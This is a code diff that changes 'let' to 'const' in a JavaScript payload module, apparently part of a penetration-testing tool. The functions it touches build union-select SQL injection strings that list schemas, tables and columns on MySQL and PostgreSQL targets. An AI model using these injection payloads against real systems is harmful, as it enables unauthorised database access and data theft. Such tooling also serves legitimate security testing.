@@ -24,7 +24,7 @@ window.Payload.SQLi = {
         return ''
       }
 
-      let fields = Array.from(Array(columns + 1).keys()).slice(1)
+      const fields = Array.from(Array(columns + 1).keys()).slice(1)
       fields[position - 1] = 'group_concat(schema_name)'
 
       return 'union select ' + fields.join(',') +
@@ -39,7 +39,7 @@ window.Payload.SQLi = {
         return ''
       }
 
-      let fields = Array.from(Array(columns + 1).keys()).slice(1)
+      const fields = Array.from(Array(columns + 1).keys()).slice(1)
       fields[position - 1] = 'group_concat(table_name)'
 
       return 'union select ' + fields.join(',') +
@@ -54,7 +54,7 @@ window.Payload.SQLi = {
         return ''
       }
 
-      let fields = Array.from(Array(columns + 1).keys()).slice(1)
+      const fields = Array.from(Array(columns + 1).keys()).slice(1)
       fields[position - 1] = 'group_concat(column_name)'
 
       return 'union select ' + fields.join(',') +
@@ -84,7 +84,7 @@ window.Payload.SQLi = {
         return ''
       }
 
-      let fields = Array(columns).fill('null')
+      const fields = Array(columns).fill('null')
       fields[position - 1] = "string_agg(datname, ',')"
 
       return 'union select ' + fields.join(',') + ' from pg_database'
@@ -98,7 +98,7 @@ window.Payload.SQLi = {
         return ''
       }
 
-      let fields = Array(columns).fill('null')
+      const fields = Array(columns).fill('null')
       fields[position - 1] = "string_agg(tablename, ',')"
 
       return ' union select ' + fields.join(',') +
@@ -113,7 +113,7 @@ window.Payload.SQLi = {
         return ''
       }
 
-      let fields = Array(columns).fill('null')
+      const fields = Array(columns).fill('null')
       fields[position - 1] = "string_agg(column_name, ',')"
 
       return 'union select ' + fields.join(',') +
